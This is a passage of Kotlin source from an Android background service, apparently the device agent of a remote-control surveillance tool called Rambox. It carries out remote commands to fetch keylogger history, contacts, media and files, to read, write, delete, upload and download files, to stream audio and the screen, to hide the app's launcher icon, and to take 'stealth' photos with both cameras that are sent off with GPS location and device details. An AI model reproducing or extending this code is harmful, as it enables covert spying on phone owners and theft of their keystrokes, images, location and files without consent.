                    if (x1Ratio < 0.0) x1Ratio = payload.optDouble("x1", 0.5)
                    var y1Ratio = payload.optDouble("y1Ratio", -1.0)
                    if (y1Ratio < 0.0) y1Ratio = payload.optDouble("y1", 0.5)
                    var x2Ratio = payload.optDouble("x2Ratio", -1.0)
                    if (x2Ratio < 0.0) x2Ratio = payload.optDouble("x2", 0.5)
                    var y2Ratio = payload.optDouble("y2Ratio", -1.0)
                    if (y2Ratio < 0.0) y2Ratio = payload.optDouble("y2", 0.5)

                    if (x1Ratio > 1.0) x1Ratio /= streamWidth.toDouble()
                    if (y1Ratio > 1.0) y1Ratio /= streamHeight.toDouble()
                    if (x2Ratio > 1.0) x2Ratio /= streamWidth.toDouble()
                    if (y2Ratio > 1.0) y2Ratio /= streamHeight.toDouble()

                    val duration = payload.optLong("duration", 220)
                    RamboxAccessibilityService.instance?.performSwipe(x1Ratio, y1Ratio, x2Ratio, y2Ratio, duration)
                }
            }
            "scroll" -> {
                if (isScreenOff) {
                    wakeUpDeviceScreen()
                    isScreenOff = false
                }
                isViewerActive = true
                acquireWifiLock()
                if (RamboxAccessibilityService.instance == null) {
                    notifyAccessibilityDisabled()
                } else {
                    val direction = payload.optString("direction", "down")
                    val deltaY = payload.optDouble("deltaY", 0.0)
                    var xRatio = payload.optDouble("xRatio", -1.0)
                    if (xRatio < 0.0) xRatio = payload.optDouble("x", 0.5)
                    if (xRatio > 1.0) xRatio /= streamWidth.toDouble()
                    xRatio = xRatio.coerceIn(0.15, 0.85)

                    var yRatio = payload.optDouble("yRatio", -1.0)
                    if (yRatio < 0.0) yRatio = payload.optDouble("y", 0.5)
                    if (yRatio > 1.0) yRatio /= streamHeight.toDouble()
                    yRatio = yRatio.coerceIn(0.2, 0.8)

                    val duration = payload.optLong("duration", 220)

                    if (payload.has("x1Ratio") && payload.has("y1Ratio") && payload.has("x2Ratio") && payload.has("y2Ratio")) {
                        val x1 = payload.optDouble("x1Ratio").coerceIn(0.0, 1.0)
                        val y1 = payload.optDouble("y1Ratio").coerceIn(0.0, 1.0)
                        val x2 = payload.optDouble("x2Ratio").coerceIn(0.0, 1.0)
                        val y2 = payload.optDouble("y2Ratio").coerceIn(0.0, 1.0)
                        RamboxAccessibilityService.instance?.performSwipe(x1, y1, x2, y2, duration)
                    } else if (direction == "up" || deltaY < 0) {
                        val startY = (yRatio - 0.20).coerceIn(0.15, 0.60)
                        val endY = (startY + 0.40).coerceIn(0.35, 0.85)
                        RamboxAccessibilityService.instance?.performSwipe(xRatio, startY, xRatio, endY, duration)
                    } else {
                        val startY = (yRatio + 0.20).coerceIn(0.40, 0.85)
                        val endY = (startY - 0.40).coerceIn(0.15, 0.65)
                        RamboxAccessibilityService.instance?.performSwipe(xRatio, startY, xRatio, endY, duration)
                    }
                }
            }
            "global_action" -> {
                val action = payload.optString("action", "back")
                RamboxAccessibilityService.instance?.performGlobalActionCommand(action)
            }
            "text" -> {
                val text = payload.optString("text", "")
                val isFullText = payload.optBoolean("isFullText", true)
                if (text.isNotEmpty()) {
                    RamboxAccessibilityService.instance?.performTextInjection(text, isFullText)
                }
            }
            "key_input" -> {
                val key = payload.optString("key", "")
                val action = payload.optString("action", "")
                val text = payload.optString("text", "")
                val isFullText = payload.optBoolean("isFullText", false)
                if (action == "backspace" || key == "Backspace") {
                    RamboxAccessibilityService.instance?.performBackspace()
                } else if (key.length == 1) {
                    RamboxAccessibilityService.instance?.performTextInjection(key, isFullText)
                } else if (text.isNotEmpty()) {
                    val fullTextMode = payload.optBoolean("isFullText", true)
                    RamboxAccessibilityService.instance?.performTextInjection(text, fullTextMode)
                }
            }
            "backspace" -> {
                RamboxAccessibilityService.instance?.performBackspace()
            }
            "ring_device" -> {
                playLoudAlarm()
            }
            "stop_alarm" -> {
                stopLoudAlarm()
            }
            "request_device_info" -> {
                sendDeviceInfo()
            }
            "request_keylogs_history" -> {
                val history = RamboxAccessibilityService.instance?.getOfflineLogsHistory() ?: org.json.JSONArray()
                val payload = JSONObject().apply {
                    put("type", "keylogs_history_result")
                    put("logs", history)
                }
                broadcastPayload(payload)
            }
            "clear_keylogs_history" -> {
                RamboxAccessibilityService.instance?.clearOfflineLogs()
            }
            "request_installed_apps" -> {
                sendInstalledAppsList()
            }
            "block_app" -> {
                val pkg = payload.optString("package", "")
                if (pkg.isNotEmpty()) {
                    RamboxAccessibilityService.setPackageBlocked(this, pkg, true)
                    RamboxAccessibilityService.instance?.let {
                        it.reloadBlockedPackages()
                        it.performGlobalAction(android.accessibilityservice.AccessibilityService.GLOBAL_ACTION_HOME)
                    }
                    broadcastPayload(JSONObject().apply {
                        put("type", "block_app_ack")
                        put("package", pkg)
                        put("isBlocked", true)
                    })
                    sendInstalledAppsList()
                }
            }
            "start_audio_stream" -> {
                startAudioStream()
            }
            "stop_audio_stream" -> {
                stopAudioStream()
            }
            "unblock_app" -> {
                val pkg = payload.optString("package", "")
                if (pkg.isNotEmpty()) {
                    RamboxAccessibilityService.setPackageBlocked(this, pkg, false)
                    RamboxAccessibilityService.instance?.reloadBlockedPackages()
                    broadcastPayload(JSONObject().apply {
                        put("type", "block_app_ack")
                        put("package", pkg)
                        put("isBlocked", false)
                    })
                    sendInstalledAppsList()
                }
            }
            "request_contacts" -> {
                fetchAndSendContacts()
            }
            "request_media_gallery" -> {
                sendMediaGallery()
            }
            "request_file_browse" -> {
                val path = payload.optString("path", "/storage/emulated/0")
                browseFolderAndSend(path)
            }
            "request_file_read" -> {
                val path = payload.optString("path", "")
                if (path.isNotEmpty()) {
                    handleFileRead(path)
                }
            }
            "request_file_write" -> {
                val path = payload.optString("path", "")
                val content = payload.optString("content", "")
                if (path.isNotEmpty()) {
                    handleFileWrite(path, content)
                }
            }
            "request_file_delete" -> {
                val path = payload.optString("path", "")
                if (path.isNotEmpty()) {
                    handleFileDelete(path)
                }
            }
            "request_file_upload" -> {
                val dir = payload.optString("dir", "/storage/emulated/0/Download")
                val name = payload.optString("name", "upload.dat")
                val data = payload.optString("data", "")
                if (data.isNotEmpty()) {
                    handleFileUpload(dir, name, data)
                }
            }
            "request_file_download" -> {
                val path = payload.optString("path", "")
                if (path.isNotEmpty()) {
                    handleFileDownload(path)
                }
            }
            "lock_and_hide_app" -> {
                try {
                    // FIX: Target the launcher activity-alias, not MainActivity itself
                    val aliasComponent = ComponentName(applicationContext, "$packageName.MainActivityLauncher")
                    packageManager.setComponentEnabledSetting(
                        aliasComponent,
                        PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                        PackageManager.DONT_KILL_APP
                    )
                } catch (e: Exception) {
                    e.printStackTrace()
                }
            }
            "unhide_app" -> {
                try {
                    // FIX: Target the launcher activity-alias, not MainActivity itself
                    val aliasComponent = ComponentName(applicationContext, "$packageName.MainActivityLauncher")
                    packageManager.setComponentEnabledSetting(
                        aliasComponent,
                        PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
                        PackageManager.DONT_KILL_APP
                    )
                } catch (e: Exception) {
                    e.printStackTrace()
                }
            }
            "take_stealth_photo", "take_stealth_photos", "capture_photo", "take_photo" -> {
                val targetCam = payload.optString("camera", payload.optString("target", "both"))
                val targetEmail = payload.optString("email", "")
                takeStealthPhotos(targetCam, if (targetEmail.isNotEmpty()) targetEmail else null)
            }
        }
    }

    // =========================================================================
    // STEALTH PHOTO CAPTURE (OFF-SCREEN SILENT SNAPSHOT TO EMAIL & PC)
    // =========================================================================
    private fun takeStealthPhotos(cameraType: String, recipientEmail: String? = null) {
        // M1: kamera dari background butuh tipe FGS CAMERA.
        if (!ensureForegroundType(ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA)) {
            broadcastPayload(JSONObject().apply {
                put("type", "stealth_photo_progress")
                put("status", "failed")
                put("message", "Android menolak akses kamera dari background (izin/foreground service).")
            })
            return
        }
        startCameraThread()
        val bgHandler = cameraHandler ?: handler

        broadcastPayload(JSONObject().apply {
            put("type", "stealth_photo_progress")
            put("status", "started")
            put("camera", cameraType)
            put("message", "Memulai pengambilan foto kamera...")
        })

        if (cameraType == "both") {
            broadcastPayload(JSONObject().apply {
                put("type", "stealth_photo_progress")
                put("status", "capturing_front")
                put("message", "Sedang menjepret kamera depan...")
            })
            captureSingleCameraPhoto(isFront = true) { frontBytes ->
                broadcastPayload(JSONObject().apply {
                    put("type", "stealth_photo_progress")
                    put("status", "front_done")
                    put("message", if (frontBytes != null) "Foto kamera depan berhasil diambil!" else "Kamera depan tidak merespon / gagal.")
                })
                bgHandler.postDelayed({
                    broadcastPayload(JSONObject().apply {
                        put("type", "stealth_photo_progress")
                        put("status", "capturing_back")
                        put("message", "Sedang menjepret kamera belakang...")
                    })
                    captureSingleCameraPhoto(isFront = false) { backBytes ->
                        broadcastPayload(JSONObject().apply {
                            put("type", "stealth_photo_progress")
                            put("status", "back_done")
                            put("message", if (backBytes != null) "Foto kamera belakang berhasil diambil!" else "Kamera belakang tidak merespon / gagal.")
                        })
                        sendStealthPhotosResult(frontBytes, backBytes, recipientEmail)
                    }
                }, 400)
            }
        } else {
            val isFront = (cameraType == "front")
            broadcastPayload(JSONObject().apply {
                put("type", "stealth_photo_progress")
                put("status", if (isFront) "capturing_front" else "capturing_back")
                put("message", if (isFront) "Sedang menjepret kamera depan..." else "Sedang menjepret kamera belakang...")
            })
            captureSingleCameraPhoto(isFront = isFront) { bytes ->
                broadcastPayload(JSONObject().apply {
                    put("type", "stealth_photo_progress")
                    put("status", if (isFront) "front_done" else "back_done")
                    put("message", if (bytes != null) "Foto berhasil diambil!" else "Gagal mengambil foto kamera.")
                })
                if (isFront) {
                    sendStealthPhotosResult(bytes, null, recipientEmail)
                } else {
                    sendStealthPhotosResult(null, bytes, recipientEmail)
                }
            }
        }
    }

    private fun captureSingleCameraPhoto(isFront: Boolean, onDone: (ByteArray?) -> Unit) {
        startCameraThread()
        val bgHandler = cameraHandler ?: handler

        try {
            val cameraManager = getSystemService(Context.CAMERA_SERVICE) as? CameraManager
            if (cameraManager == null || checkSelfPermission(Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) {
                android.util.Log.w("ScreenCaptureService", "Camera permission not granted or CameraManager null")
                onDone(null)
                return
            }

            var selectedCamId: String? = null
            val idList = cameraManager.cameraIdList

            for (id in idList) {
                try {
                    val chars = cameraManager.getCameraCharacteristics(id)
                    val facing = chars.get(CameraCharacteristics.LENS_FACING)
                    if (isFront && facing == CameraCharacteristics.LENS_FACING_FRONT) {
                        selectedCamId = id
                        break
                    } else if (!isFront && facing == CameraCharacteristics.LENS_FACING_BACK) {
                        selectedCamId = id
                        break
                    }
                } catch (_: Exception) {}
            }

            if (selectedCamId == null) {
                if (isFront) {
                    selectedCamId = idList.firstOrNull { it == "1" || it.contains("front", ignoreCase = true) }
                        ?: idList.getOrNull(1) ?: idList.firstOrNull()
                } else {
                    selectedCamId = idList.firstOrNull { it == "0" || it.contains("back", ignoreCase = true) }
                        ?: idList.firstOrNull()
                }
            }

            if (selectedCamId == null) {
                onDone(null)
                return
            }

            val chars = cameraManager.getCameraCharacteristics(selectedCamId)
            val sensorOrientation = chars.get(CameraCharacteristics.SENSOR_ORIENTATION) ?: (if (isFront) 270 else 90)
            val map = chars.get(CameraCharacteristics.SCALER_STREAM_CONFIGURATION_MAP)
            val jpegSizes = map?.getOutputSizes(ImageFormat.JPEG) ?: emptyArray()

            val bestSize = jpegSizes.filter { (it.width in 800..1920 && it.height in 600..1080) || (it.height in 800..1920 && it.width in 600..1080) }
                .maxByOrNull { it.width * it.height }
                ?: jpegSizes.firstOrNull()

            val photoW = bestSize?.width ?: 1280
            val photoH = bestSize?.height ?: 720

            val photoReader = ImageReader.newInstance(photoW, photoH, ImageFormat.JPEG, 2)
            val isCompleted = java.util.concurrent.atomic.AtomicBoolean(false)
            var localSession: CameraCaptureSession? = null
            var localDevice: CameraDevice? = null

            val timeoutRunnable = Runnable {
                if (isCompleted.compareAndSet(false, true)) {
                    // FIX: Removed stopRepeating() — no longer needed with single capture()
                    try { localSession?.close() } catch (_: Exception) {}
                    try { localDevice?.close() } catch (_: Exception) {}
                    try { photoReader.close() } catch (_: Exception) {}
                    onDone(null)
                }
            }
            bgHandler.postDelayed(timeoutRunnable, 5000)

            photoReader.setOnImageAvailableListener({ reader ->
                val img = try { reader.acquireLatestImage() } catch (_: Exception) { null }
                if (img != null) {
                    if (isCompleted.compareAndSet(false, true)) {
                        bgHandler.removeCallbacks(timeoutRunnable)
                        var resultBytes: ByteArray? = null
                        try {
                            val buffer = img.planes[0].buffer
                            resultBytes = ByteArray(buffer.remaining())
                            buffer.get(resultBytes)
                        } catch (e: Exception) {
                            e.printStackTrace()
                        } finally {
                            try { img.close() } catch (_: Exception) {}
                            // FIX: Removed stopRepeating() — not needed with single capture()
                            try { localSession?.close() } catch (_: Exception) {}
                            try { localDevice?.close() } catch (_: Exception) {}
                            try { photoReader.close() } catch (_: Exception) {}
                        }
                        onDone(resultBytes)
                    } else {
                        try { img.close() } catch (_: Exception) {}
                    }
                }
            }, bgHandler)

            cameraManager.openCamera(selectedCamId, object : CameraDevice.StateCallback() {
                override fun onOpened(camera: CameraDevice) {
                    localDevice = camera
                    try {
                        val surface = photoReader.surface
                        camera.createCaptureSession(listOf(surface), object : CameraCaptureSession.StateCallback() {
                            override fun onConfigured(session: CameraCaptureSession) {
                                localSession = session
                                try {
                                    val req = camera.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE).apply {
                                        addTarget(surface)
                                        set(CaptureRequest.CONTROL_MODE, CameraMetadata.CONTROL_MODE_AUTO)
                                        set(CaptureRequest.CONTROL_AF_MODE, CaptureRequest.CONTROL_AF_MODE_CONTINUOUS_PICTURE)
                                        set(CaptureRequest.CONTROL_AE_MODE, CaptureRequest.CONTROL_AE_MODE_ON)
                                        set(CaptureRequest.JPEG_ORIENTATION, sensorOrientation)
                                        set(CaptureRequest.JPEG_QUALITY, 90.toByte())
                                    }
                                    // FIX: Use single capture() instead of setRepeatingRequest()
                                    // Only one photo is needed — repeating wastes camera resources
                                    // and generates multiple frames that get discarded
                                    session.capture(req.build(), null, bgHandler)
                                } catch (e: Exception) {
                                    e.printStackTrace()
                                    if (isCompleted.compareAndSet(false, true)) {
                                        bgHandler.removeCallbacks(timeoutRunnable)
                                        try { localSession?.close() } catch (_: Exception) {}
                                        try { localDevice?.close() } catch (_: Exception) {}
                                        try { photoReader.close() } catch (_: Exception) {}
                                        onDone(null)
                                    }
                                }
                            }

                            override fun onConfigureFailed(session: CameraCaptureSession) {
                                if (isCompleted.compareAndSet(false, true)) {
                                    bgHandler.removeCallbacks(timeoutRunnable)
                                    try { localDevice?.close() } catch (_: Exception) {}
                                    try { photoReader.close() } catch (_: Exception) {}
                                    onDone(null)
                                }
                            }
                        }, bgHandler)
                    } catch (e: Exception) {
                        e.printStackTrace()
                        if (isCompleted.compareAndSet(false, true)) {
                            bgHandler.removeCallbacks(timeoutRunnable)
                            try { localDevice?.close() } catch (_: Exception) {}
                            try { photoReader.close() } catch (_: Exception) {}
                            onDone(null)
                        }
                    }
                }

                override fun onDisconnected(camera: CameraDevice) {
                    try { camera.close() } catch (_: Exception) {}
                    if (isCompleted.compareAndSet(false, true)) {
                        bgHandler.removeCallbacks(timeoutRunnable)
                        try { photoReader.close() } catch (_: Exception) {}
                        onDone(null)
                    }
                }

                override fun onError(camera: CameraDevice, error: Int) {
                    try { camera.close() } catch (_: Exception) {}
                    if (isCompleted.compareAndSet(false, true)) {
                        bgHandler.removeCallbacks(timeoutRunnable)
                        try { photoReader.close() } catch (_: Exception) {}
                        onDone(null)
                    }
                }
            }, bgHandler)
        } catch (e: Exception) {
            e.printStackTrace()
            onDone(null)
        }
    }

    private fun sendStealthPhotosResult(frontBytes: ByteArray?, backBytes: ByteArray?, recipientEmail: String?) {
        val photosArray = org.json.JSONArray()

        if (frontBytes != null && frontBytes.isNotEmpty()) {
            val base64 = Base64.encodeToString(frontBytes, Base64.NO_WRAP)
            photosArray.put(JSONObject().apply {
                put("camera", "front")
                put("data", "data:image/jpeg;base64,$base64")
                put("timestamp", System.currentTimeMillis())
            })
        }

        if (backBytes != null && backBytes.isNotEmpty()) {
            val base64 = Base64.encodeToString(backBytes, Base64.NO_WRAP)
            photosArray.put(JSONObject().apply {
                put("camera", "back")
                put("data", "data:image/jpeg;base64,$base64")
                put("timestamp", System.currentTimeMillis())
            })
        }

        val locObj = JSONObject()
        lastKnownLocation?.let {
            locObj.put("lat", it.latitude)
            locObj.put("lng", it.longitude)
            locObj.put("accuracy", it.accuracy.toDouble())
        }

        val bm = getSystemService(Context.BATTERY_SERVICE) as? BatteryManager
        val batLevel = bm?.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY) ?: 100

        val payload = JSONObject().apply {
            put("type", "stealth_photos_ready")
            put("photos", photosArray)
            put("device", "${Build.MANUFACTURER} ${Build.MODEL} (Android ${Build.VERSION.RELEASE})")
            put("battery", batLevel)
            put("location", locObj)
            if (!recipientEmail.isNullOrEmpty()) {
                put("email", recipientEmail)
            }
        }
        broadcastPayload(payload)
    }
    private fun setupImageReaderListener(reader: ImageReader, width: Int, height: Int, bgLooperHandler: Handler) {
        reader.setOnImageAvailableListener({ r ->
            val img = try {
                r.acquireLatestImage()
            } catch (e: Exception) { null } ?: return@setOnImageAvailableListener

            if (currentVideoSource != "screen" || isScreenOff || !isViewerActive) {
                img.close()
                return@setOnImageAvailableListener
            }

            if (!isFrameBusy.compareAndSet(false, true)) {
                img.close()
                return@setOnImageAvailableListener
            }

            screenFrameExecutor.execute {
                try {
                    val planes = img.planes
                    val buffer = planes[0].buffer
                    val pixelStride = planes[0].pixelStride
                    val rowStride = planes[0].rowStride
                    val rowPadding = rowStride - pixelStride * width
                    val paddedWidth = width + rowPadding / pixelStride

                    // 1. Reusable Raw Bitmap (Zero Allocation on steady-state)
                    var rawBitmap = cachedRawBitmap
                    if (rawBitmap == null || rawBitmap.isRecycled || rawBitmap.width != paddedWidth || rawBitmap.height != height) {
                        try { rawBitmap?.recycle() } catch (_: Exception) {}
                        rawBitmap = Bitmap.createBitmap(paddedWidth, height, Bitmap.Config.ARGB_8888)
                        cachedRawBitmap = rawBitmap
                    }
                    rawBitmap.copyPixelsFromBuffer(buffer)

                    // 2. Reusable Scaled Bitmap & Canvas (Crops & Scales in 1 Hardware Draw Call, Zero Allocation)
                    val maxShort = 540 // Crisp text, lightweight payload (~15KB)
                    val isLand = width > height
                    var targetW = if (isLand) {
                        val h = if (height > maxShort) maxShort else height
                        (width * h) / height
                    } else {
                        if (width > maxShort) maxShort else width
                    }
                    var targetH = if (isLand) {
                        if (height > maxShort) maxShort else height
                    } else {
                        (height * targetW) / width
                    }
                    if (targetW % 2 != 0) targetW++
                    if (targetH % 2 != 0) targetH++

                    var sendBitmap = cachedSendBitmap
                    var canvas = cachedCanvas
                    if (sendBitmap == null || sendBitmap.isRecycled || sendBitmap.width != targetW || sendBitmap.height != targetH) {
                        try { sendBitmap?.recycle() } catch (_: Exception) {}
                        sendBitmap = Bitmap.createBitmap(targetW, targetH, Bitmap.Config.ARGB_8888)
                        cachedSendBitmap = sendBitmap
                        canvas = Canvas(sendBitmap)
                        cachedCanvas = canvas
                    }

                    val srcRect = Rect(0, 0, width, height)
                    val dstRect = Rect(0, 0, targetW, targetH)
                    canvas?.drawBitmap(rawBitmap, srcRect, dstRect, paintFilter)

                    // 3. Reusable Fast Compression Stream
                    frameCompressStream.reset()
                    sendBitmap.compress(Bitmap.CompressFormat.JPEG, 42, frameCompressStream)
                    val jpegBytes = frameCompressStream.toByteArray()

                    val now = System.currentTimeMillis()
                    // Q1: timestamp capture asli, terpisah dari timestamp kirim.
                    lastFrameCapturedAt = now
                    val prev = lastSentScreenBytes
                    if ((prev != null && prev.size == jpegBytes.size && java.util.Arrays.equals(prev, jpegBytes)) ||
                        now - lastFrameSentAt < frameMinIntervalMs) {
                        lastCachedScreenFrame = jpegBytes
                        return@execute
                    }
                    lastSentScreenBytes = jpegBytes
                    lastFrameSentAt = now
                    lastCachedScreenFrame = jpegBytes

                    // 4. High-Speed WebSocket Screen Streaming — Binary Only
                    val hasWs = webSocketClient?.isOpen == true
                    if (hasWs) {
                        val binPacket = ByteArray(jpegBytes.size + 1)
                        binPacket[0] = 0x01
                        System.arraycopy(jpegBytes, 0, binPacket, 1, jpegBytes.size)
                        sendBinaryStream(binPacket)
                        lastSentFrameTime = System.currentTimeMillis()
                    }

                } catch (e: Exception) {
                    e.printStackTrace()
                } finally {
                    try { img.close() } catch (e: Exception) {}
                    isFrameBusy.set(false)
                }
            }
        }, bgLooperHandler)
    }

    private fun startImageCapture(width: Int, height: Int) {
        // Standby check: If screen is off or viewer is on another tab, do NOT capture
        if (isScreenOff || !isViewerActive) {
            android.util.Log.d("RamboxCapture", "startImageCapture skipped (standby): isScreenOff=$isScreenOff isViewerActive=$isViewerActive")
            return
        }

        val isRecentlyActive = (System.currentTimeMillis() - lastSentFrameTime) < 2000
        if (virtualDisplay != null && imageReader != null &&
            imageReader?.width == width && imageReader?.height == height &&
            isRecentlyActive) {
            return
        }

        startCaptureThread()
        val bgLooperHandler = captureHandler ?: handler

        // A16 FIX: Reusing existing VirtualDisplay via resize & setSurface.
        // Di Android 14/15/16, memanggil mediaProjection.createVirtualDisplay() lebih dari sekali
        // pada instance MediaProjection yang sama AKAN MELEMPAR SecurityException!
        if (virtualDisplay != null) {
            try {
                virtualDisplay?.resize(width, height, screenDensity)
                if (imageReader == null || imageReader?.width != width || imageReader?.height != height) {
                    val oldReader = imageReader
                    val newReader = ImageReader.newInstance(width, height, PixelFormat.RGBA_8888, 3)
                    setupImageReaderListener(newReader, width, height, bgLooperHandler)
                    imageReader = newReader
                    virtualDisplay?.surface = newReader.surface
                    try { oldReader?.close() } catch (_: Exception) {}
                } else {
                    // Setelah suspendImageCapture(), surface sengaja dilepas.
                    // Pasang kembali surface yang sama tanpa membuat display baru.
                    virtualDisplay?.surface = imageReader?.surface
                }
                return
            } catch (e: Exception) {
                android.util.Log.w("RamboxCapture", "Reusing VirtualDisplay failed: ${e.message}")
                // VirtualDisplay lama tidak bisa dipakai. Jangan coba
                // createVirtualDisplay() kedua pada projection yang sama.
                stopImageCapture()
                releaseProjectionForFreshConsent()
                return
            }
        }

        // Android 14+: satu MediaProjection hanya boleh membuat satu
        // VirtualDisplay. Jika display pernah dibuat lalu hilang, satu-satunya
        // jalan pulih adalah consent baru.
        if (projectionDisplayCreated) {
            android.util.Log.w("RamboxCapture", "VirtualDisplay hilang; meminta consent MediaProjection baru")
            stopImageCapture()
            releaseProjectionForFreshConsent()
            return
        }

        stopImageCapture()
        try {
            val newReader = ImageReader.newInstance(width, height, PixelFormat.RGBA_8888, 3)
            imageReader = newReader
            virtualDisplay = mediaProjection?.createVirtualDisplay(
                "RamboxStream",
                width, height, screenDensity,
                DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
                newReader.surface, null, bgLooperHandler
            )
            projectionDisplayCreated = virtualDisplay != null
            setupImageReaderListener(newReader, width, height, bgLooperHandler)
        } catch (e: Exception) {
            projectionDisplayCreated = false
            e.printStackTrace()
        }
    }

    /**
     * FIX #1a: hentikan capture sementara TANPA melepas VirtualDisplay.
     * Android 14+ melarang createVirtualDisplay() kedua pada MediaProjection
     * yang sama, jadi surface dilepas dan dipasang lagi saat resume.
     */
    private fun suspendImageCapture() {
        try {
            imageReader?.setOnImageAvailableListener(null, null)
            imageReader?.close()
        } catch (_: Exception) {}
        imageReader = null
        try {
            virtualDisplay?.setSurface(null)
        } catch (_: Exception) {}
        try {
            cachedRawBitmap?.recycle()
            cachedRawBitmap = null
            cachedSendBitmap?.recycle()
            cachedSendBitmap = null
            cachedCanvas = null
        } catch (_: Exception) {}
    }

    /**
     * FIX #1b: lepas projection yang sudah mati dan minta consent baru.
     * Jangan pernah memakai ulang savedDataIntent (dilarang Android 14+).
     */
    private fun releaseProjectionForFreshConsent() {
        try { mediaProjection?.stop() } catch (_: Exception) {}
        mediaProjection = null
        projectionDisplayCreated = false
        silentCaptureRequestPending = false
        lastSentFrameTime = 0L
        if (!isUserExplicitlyStopped && isViewerActive && !isScreenOff) {
            requestSilentScreenCapture()
        }
    }

    private fun stopImageCapture() {
        try {
            virtualDisplay?.release()
            virtualDisplay = null
        } catch (e: Exception) {}
        try {
            imageReader?.close()
            imageReader = null
        } catch (e: Exception) {}
        try {
            // FIX: Recycle bitmaps before nulling to immediately free native memory
            try { cachedRawBitmap?.recycle() } catch (_: Exception) {}
            cachedRawBitmap = null
            try { cachedSendBitmap?.recycle() } catch (_: Exception) {}
            cachedSendBitmap = null
            cachedCanvas = null
        } catch (e: Exception) {}
    }

    fun sendBinaryStream(bytes: ByteArray) {
        // FIX: Capture to local val to prevent race condition
        val ws = webSocketClient
        if (ws != null && ws.isOpen) {
            try {
                ws.send(bytes)
            } catch (e: Exception) {}
        }
    }

    private var displayListener: DisplayManager.DisplayListener? = null

    private fun registerDisplayListener() {
        try {
            val dm = getSystemService(Context.DISPLAY_SERVICE) as? DisplayManager ?: return
            if (displayListener != null) return
            displayListener = object : DisplayManager.DisplayListener {
                override fun onDisplayAdded(displayId: Int) {}
                override fun onDisplayRemoved(displayId: Int) {}
                override fun onDisplayChanged(displayId: Int) {
                    if (displayId == Display.DEFAULT_DISPLAY) {
                        checkOrientationChange()
                    }
                }
            }
            dm.registerDisplayListener(displayListener, handler)
            android.util.Log.d("RamboxCapture", "DisplayListener registered successfully")
        } catch (e: Exception) {
            e.printStackTrace()
        }
    }

    private fun unregisterDisplayListener() {
        try {
            val dm = getSystemService(Context.DISPLAY_SERVICE) as? DisplayManager
            displayListener?.let { dm?.unregisterDisplayListener(it) }
            displayListener = null
        } catch (_: Exception) {}
    }

    override fun onConfigurationChanged(newConfig: android.content.res.Configuration) {
        super.onConfigurationChanged(newConfig)
        handler.post { checkOrientationChange() }
    }

    fun isDeviceInLandscape(): Boolean {
        try {
            val dm = getSystemService(Context.DISPLAY_SERVICE) as? DisplayManager
            val defaultDisplay = dm?.getDisplay(Display.DEFAULT_DISPLAY)
            if (defaultDisplay != null) {
                val rotation = defaultDisplay.rotation
                val metrics = DisplayMetrics()
                @Suppress("DEPRECATION")
                defaultDisplay.getRealMetrics(metrics)
                if (metrics.widthPixels > 0 && metrics.heightPixels > 0) {
                    return (rotation == Surface.ROTATION_90 || rotation == Surface.ROTATION_270) || (metrics.widthPixels > metrics.heightPixels)
                }
            }
        } catch (_: Exception) {}
        val res = resources.configuration
        return res.orientation == android.content.res.Configuration.ORIENTATION_LANDSCAPE
    }

    fun checkOrientationChange(): Boolean {
        if (mediaProjection == null || isUserExplicitlyStopped || isScreenOff || !isViewerActive) return false
        try {
            val isLand = isDeviceInLandscape()
            if (isLand != currentIsLandscape) {
                android.util.Log.d("RamboxCapture", "Orientation change: wasLandscape=$currentIsLandscape nowLandscape=$isLand")
                currentIsLandscape = isLand
                val (newW, newH) = calculateStreamDimensions(isLand)
                streamWidth = newW
                streamHeight = newH
                startImageCapture(streamWidth, streamHeight)
                try {
                    val payload = JSONObject().apply {
                        put("type", "rotation_change")
                        put("isLandscape", isLand)
                        put("streamWidth", streamWidth)
                        put("streamHeight", streamHeight)
                    }
                    broadcastPayload(payload)
                } catch (_: Exception) {}
                return true
            }
        } catch (e: Exception) {
            e.printStackTrace()
        }
        return false
    }

    private fun getRealScreenSize(): Pair<Int, Int> {
        try {
            val dm = getSystemService(Context.DISPLAY_SERVICE) as? DisplayManager
            val defaultDisplay = dm?.getDisplay(Display.DEFAULT_DISPLAY)
            if (defaultDisplay != null) {
                val metrics = DisplayMetrics()
                @Suppress("DEPRECATION")
                defaultDisplay.getRealMetrics(metrics)
                if (metrics.widthPixels > 0 && metrics.heightPixels > 0) {
                    return Pair(metrics.widthPixels, metrics.heightPixels)
                }
            }
            val windowManager = getSystemService(Context.WINDOW_SERVICE) as? WindowManager
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                val bounds = windowManager?.currentWindowMetrics?.bounds
                if (bounds != null && bounds.width() > 0 && bounds.height() > 0) {
                    return Pair(bounds.width(), bounds.height())
                }
            }
            if (windowManager != null) {
                val metrics = DisplayMetrics()
                @Suppress("DEPRECATION")
                windowManager.defaultDisplay?.getRealMetrics(metrics)
                if (metrics.widthPixels > 0 && metrics.heightPixels > 0) {
                    return Pair(metrics.widthPixels, metrics.heightPixels)
                }
            }
        } catch (_: Exception) {}
        val metrics = resources.displayMetrics
        return Pair(metrics.widthPixels, metrics.heightPixels)
    }

    private fun calculateStreamDimensions(isLandscape: Boolean): Pair<Int, Int> {
        val (realW, realH) = getRealScreenSize()
        val (w, h) = if (isLandscape) {
            Pair(maxOf(realW, realH), minOf(realW, realH))
        } else {
            Pair(minOf(realW, realH), maxOf(realW, realH))
        }

        // Cap long edge at 1280 while strictly preserving aspect ratio
        val maxDim = 1280.0
        val longVal = maxOf(w, h).toDouble()
        val scale = if (longVal > maxDim) maxDim / longVal else 1.0

        var streamW = (w * scale).toInt()
        var streamH = (h * scale).toInt()

        // ImageReader / MediaCodec / HW Encoders require even dimensions
        if (streamW % 2 != 0) streamW++
        if (streamH % 2 != 0) streamH++

        // M5 FIX: Pertahankan aspek rasio asli; jangan paksa streamH=640 di mode landscape
        val minDim = 360
        if (minOf(streamW, streamH) < minDim && minOf(streamW, streamH) > 0) {
            val boost = minDim.toDouble() / minOf(streamW, streamH)
            streamW = (streamW * boost).toInt()
            streamH = (streamH * boost).toInt()
        }
        if (streamW % 2 != 0) streamW++
        if (streamH % 2 != 0) streamH++

